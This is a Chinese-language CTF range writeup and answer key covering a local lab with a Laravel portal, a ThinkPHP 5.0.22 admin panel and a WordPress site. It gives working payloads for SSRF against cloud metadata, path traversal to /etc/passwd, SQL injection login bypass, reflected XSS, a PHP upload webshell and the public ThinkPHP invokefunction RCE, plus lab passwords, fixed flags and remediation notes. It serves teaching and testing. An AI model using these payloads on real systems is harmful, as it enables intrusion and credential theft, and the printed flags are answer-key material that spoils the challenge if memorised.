# Writeup

以下内容仅供授课老师、助教、靶场维护人员和想要对照答案的挑战者使用。

示例地址：portal `http://localhost:8101`、admin `http://localhost:8201`、news `http://localhost:8301`。文件系统、环境变量和响应内的 flag 每次启动容器随机生成；数据库（SQLI、IDOR）与元数据服务（SSRF）的 flag 为固定值，直接写在 `db/init.sql` 和 `metadata/internal_metadata.py` 中。

系统构成：

| 系统 | 端口 | 框架 | 说明 |
|---|---|---|---|
| portal 主站 | 8101 | Laravel 7.30（PHP 7.4，APP_DEBUG=true） | 会员/活动报名/物资目录/链接预览/文件下载 |
| admin 运营后台 | 8201 | ThinkPHP 5.0.22 | 登录、数据总览 |
| news 资讯站 | 8301 | WordPress 最新版 + 插件「星澜会员通」 | 资讯、会员电子卡、会员数据导入 |

## 0. 账号

主站测试账号：

```text
test@starlan.club / 123456
```

（另有 alice@starlan.club / alice0817、bob@starlan.club / bob@finance 可用于演示越权场景。）

资讯站后台（交接弱口令）：

```text
admin / Starlan@2026
```

运营后台没有已知明文密码，唯一入口是 SQL 注入（见第 6 条）——这正是该题的设计。

## 1. 敏感信息泄露：Laravel 调试报错（INFO flag，每次启动随机）

主站「链接预览」功能（登录后 `/preview`）用 Guzzle 抓取用户提交的 URL。提交一个非法 URL（如 `::::`）触发 500：

```http
POST /preview HTTP/1.1
(需携带登录 Cookie 与 CSRF token，正常在页面上提交即可)

url=::::
```

Laravel `APP_DEBUG=true`，Ignition 报错页的异常消息中带出了排查问题时遗留的调试上下文：

```text
[debug ctx] sms_secret=flag{...} URI must include a scheme and host...
```

`sms_secret` 即 INFO flag。考察点：生产环境开 DEBUG + 报错消息携带敏感上下文，两者叠加的经典信息泄露。

## 2. 备份文件（BACKUP flag，每次启动随机）

对主站做目录扫描或根据部署习惯猜测，web 根目录残留部署备份：

```text
http://localhost:8101/backup.zip
```

无需登录即可下载。解压得到旧版 `.env`，其中 `SMS_API_SECRET` 即 BACKUP flag。考察点：部署产物残留 + 旧密钥未轮换。

## 3. IDOR 越权（IDOR flag，数据库固定）

登录后查看自己的活动报名（`/registration/{id}`），报名 id 为连续整数且服务端不校验归属。用 test 账号（报名 id=1）枚举：

```text
/registration/1
/registration/2
/registration/3   ← 管理员的报名
```

id=3 是管理员本人的报名，身份证/手机号直接泄露；备注字段中含财务对接暗号，即 IDOR flag：

```text
flag{9d2f5c81a7b3e604d8c2f1a5b9e3742c}
```

## 4. SSRF 打云元数据（SSRF flag，全局固定）

链接预览功能本质是服务端发起请求，且未限制目标地址。平台"部署在云上"，直接让服务器访问实例元数据服务：

```text
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/club-platform
```

返回模拟 IAM 临时凭证，`SecretAccessKey` 即 SSRF flag（真实场景中该凭证可直接接管云资源）：

```text
flag{a1f4c2d8e9b063715c4a8d2f0e6b9c3d}
```

（该值固定，写在 `metadata/internal_metadata.py` 中。）考察点：SSRF 的危害不在"请求成功"，而在内网/链路本地地址段可达。

## 5. 本地文件包含（LFI flag，每次启动随机）

主站文件下载接口 `/files/download?name=` 直接把用户输入拼进 `storage_path('app/public/')`，未做路径校验。穿越 5 层读到 web 目录外的遗留支付网关配置：

```text
/files/download?name=../../../../../var/www/legacy_config.txt
```

其中 `api_key` 即 LFI flag。读 `/etc/passwd`（`name=../../../../../etc/passwd`）可作为影响佐证。考察点：下载接口的路径穿越（本质是 LFI 的读文件面）。

## 6. SQL 注入登录绕过（SQLI flag，数据库固定）

运营后台登录（`http://localhost:8201`，`/index.php/index/login/doLogin`）。用户名被直接拼进 `whereRaw`：

```php
->whereRaw("username = '" . $data['username'] . "' AND password = '" . md5($data['password']) . "'")
```

注意 TP5 会把 where 包在括号里，`--` 注释会连右括号一起吃掉导致语法错误，需要用恒真条件绕过：

```text
username=admin' or '1'='1' or '1'='1&password=任意
```

成功后以 admin 身份进入后台，首页「账号信息」表的备注字段即 SQLI flag：

```text
flag{b71e4a92c3d8f6051a4e9c2d7b8f3610}
```

考察点：字符串拼接 SQL；以及闭合括号的注入技巧。

## 7. 反射 XSS（XSS flag，每次启动随机）

资讯站自研插件「星澜会员通」的会员电子卡页，`sm_card` 参数未转义直接输出：

```text
http://localhost:8301/?sm_card=<script>alert(1)</script>
```

脚本执行后查看页面源码，含一个隐藏 canary 元素，即 XSS flag：

```html
<span style="display:none">flag{...}</span>
```

考察点：自研插件输出未编码；利用成功后以页面 DOM 中埋的 canary 模拟"偷到数据"。

## 8. 文件上传 RCE（UPLOAD flag，每次启动随机）

用交接账号登录资讯站后台（`/wp-admin`，admin / Starlan@2026）。左侧菜单「会员数据导入」（插件功能页）允许上传"会员资料包"，服务端不校验类型、保留原始文件名存入 uploads：

```http
POST /wp-admin/admin-post.php
(携带登录 Cookie 与页面上的 _wpnonce，multipart)

action=sm_import
_wpnonce=...
import_file=x.php     ← 内容: <?php echo file_get_contents('/flag_upload.txt');
```

上传目录可执行 PHP，直接访问：

```text
http://localhost:8301/wp-content/uploads/x.php
```

输出 `/flag_upload.txt` 内容即 UPLOAD flag。考察点：后端无校验上传 + 上传目录可执行 = RCE。

## 9. ThinkPHP 5.0.22 远程代码执行（RCE flag，每次启动随机）

运营后台所用 ThinkPHP 5.0.22 存在著名的反序列化路由 RCE（2018-12 公开，vulhub `thinkphp/5-rce` 同款，影响 5.0.x<=5.0.22）。无需登录：

```text
http://localhost:8201/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=printenv FLAG_TP
```

（浏览器地址栏 `\` 会自动转义；用 curl 时写成 `%5C`。）输出中的 `FLAG_TP` 即 RCE flag。考察点：框架 nday 的公开利用与版本识别（报错页/响应头中确认 TP5 版本）。

> 备选演示：5.0.x 曾出现 `_method` 变量覆盖 RCE（vulhub `thinkphp/5.0.23-rce` 同源），当前靶场实测 404 不生效，如需可后续把后台降级到 5.0.23 再加此考点。

## 修复要点

- portal：生产关闭 APP_DEBUG；报错消息不得携带敏感上下文；删除 web 根目录备份；下载接口用白名单映射而非拼接路径；预览功能限制协议与目标网段（含 169.254.0.0/16、私网段、DNS 重绑定）；报名详情做归属校验。
- admin：登录查询改参数绑定；框架及时升级（5.0.23+ 已修复路由 RCE）。
- news：插件输出统一 `esc_html`；上传服务端校验类型/魔数、随机文件名、uploads 禁止执行；后台强口令与二次验证。
